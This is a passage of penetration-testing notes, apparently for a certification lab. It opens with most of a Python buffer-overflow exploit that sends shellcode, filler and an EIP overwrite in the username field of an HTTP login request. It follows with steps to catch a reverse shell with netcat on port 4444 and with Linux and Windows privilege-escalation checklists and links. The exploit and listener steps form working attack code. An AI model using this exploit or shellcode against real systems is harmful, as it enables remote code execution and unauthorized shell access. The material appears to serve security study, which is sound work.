	   shellcode = ("\xda\xca\xd9\x74\x24\xf4\xba\xba\x58\xbf\x95\x58\x29\xc9\xb1"
	   "\x52\x31\x50\x17\x03\x50\x17\x83\x7a\x5c\x5d\x60\x86\xb5\x23"
	   "\x8b\x76\x46\x44\x05\x93\x77\x44\x71\xd0\x28\x74\xf1\xb4\xc4"
	   "\xff\x57\x2c\x5e\x8d\x7f\x43\xd7\x38\xa6\x6a\xe8\x11\x9a\xed"
	   "\x6a\x68\xcf\xcd\x53\xa3\x02\x0c\x93\xde\xef\x5c\x4c\x94\x42"
	   "\x70\xf9\xe0\x5e\xfb\xb1\xe5\xe6\x18\x01\x07\xc6\x8f\x19\x5e"
	   "\xc8\x2e\xcd\xea\x41\x28\x12\xd6\x18\xc3\xe0\xac\x9a\x05\x39"
	   "\x4c\x30\x68\xf5\xbf\x48\xad\x32\x20\x3f\xc7\x40\xdd\x38\x1c"
	   "\x3a\x39\xcc\x86\x9c\xca\x76\x62\x1c\x1e\xe0\xe1\x12\xeb\x66"
	   "\xad\x36\xea\xab\xc6\x43\x67\x4a\x08\xc2\x33\x69\x8c\x8e\xe0"
	   "\x10\x95\x6a\x46\x2c\xc5\xd4\x37\x88\x8e\xf9\x2c\xa1\xcd\x95"
	   "\x81\x88\xed\x65\x8e\x9b\x9e\x57\x11\x30\x08\xd4\xda\x9e\xcf"
	   "\x1b\xf1\x67\x5f\xe2\xfa\x97\x76\x21\xae\xc7\xe0\x80\xcf\x83"
	   "\xf0\x2d\x1a\x03\xa0\x81\xf5\xe4\x10\x62\xa6\x8c\x7a\x6d\x99"
	   "\xad\x85\xa7\xb2\x44\x7c\x20\x7d\x30\x09\x33\x15\x43\xf5\x32"
	   "\x5d\xca\x13\x5e\xb1\x9b\x8c\xf7\x28\x86\x46\x69\xb4\x1c\x23"
	   "\xa9\x3e\x93\xd4\x64\xb7\xde\xc6\x11\x37\x95\xb4\xb4\x48\x03"
	   "\xd0\x5b\xda\xc8\x20\x15\xc7\x46\x77\x72\x39\x9f\x1d\x6e\x60"
	   "\x09\x03\x73\xf4\x72\x87\xa8\xc5\x7d\x06\x3c\x71\x5a\x18\xf8"
	   "\x7a\xe6\x4c\x54\x2d\xb0\x3a\x12\x87\x72\x94\xcc\x74\xdd\x70"
	   "\x88\xb6\xde\x06\x95\x92\xa8\xe6\x24\x4b\xed\x19\x88\x1b\xf9"
	   "\x62\xf4\xbb\x06\xb9\xbc\xdc\xe4\x6b\xc9\x74\xb1\xfe\x70\x19"
	   "\x42\xd5\xb7\x24\xc1\xdf\x47\xd3\xd9\xaa\x42\x9f\x5d\x47\x3f"
	   "\xb0\x0b\x67\xec\xb1\x19")
	  
	  	
	   filler = "A" * 780
	   eip = "\x83\x0c\x09\x10"
	   offset = "C" * 4
	   nops = "\x90" * 10
	  
	   inputBuffer = filler + eip + offset + nops + shellcode
	  
	  
	   content = "username=" + inputBuffer + "&password=A"
	   buffer = "POST /login HTTP/1.1\r\n"
	   buffer += "Host: 192.168.131.10\r\n"
	   buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Fire fox/52.0\r\n"
	   buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	   buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	   buffer += "Referer: http://192.168.131.10/login\r\n"
	   buffer += "Connection: close\r\n"
	   buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	   buffer += "Content-Length: "+str(len(content))+"\r\n"
	   buffer += "\r\n"
	   buffer += content
	   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	  
	   s.connect(("192.168.131.10",80))
	   s.send(buffer) 
	   s.close()
	    
	   print "\nDone!"
	  
	  except:
	   print "Could not connect!
	  

### Start port listener	

- Start a listener with nc -nvlp <port used in msfvenom>

	- nc -lnvp 4444

### Gain a shell and access	

- Watch for a reverse connection

## Privilege Escalation

### Linux

- 1. **Check current access first**:
- Am I in sudoers?
- Do I have sudoedit access to useful files?
- 2. Enumerate!

  Good resources:
  
  

- http://netsec.ws/?p=309
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List
- https://www.rebootuser.com/?p=1623
- https://www.kernel-exploits.com/
- http://security.stackexchange.com/questions/101715/automatically-enumerate-missing-patches-on-penetration-test

  If still stuck, try Dirty COW: https://github.com/dirtycow/dirtycow.github.io/wiki
  
  

### Windows

- 1. **Check current access first**:
- Am I already Administrator?
- Am I in Remote Desktop Users?
- 2. Enumerate!

  Good resources:
  
  

- http://www.fuzzysecurity.com/tutorials/16.html
- http://it-ovid.blogspot.com.au/2012/02/windows-privilege-escalation.html?m=1
- http://www.greyhathacker.net/?p=738
- https://www.youtube.com/watch?v=kMG8IsCohHAhttps://www.youtube.com/watch?v=PC_iMqiuIR

## Misc tools

### `cewl` for crawling a site for bruteforcing user/password

### don't forget about `nmap` scripts!

- e.g. `--script smtp-commands` or `--script auth-owners`

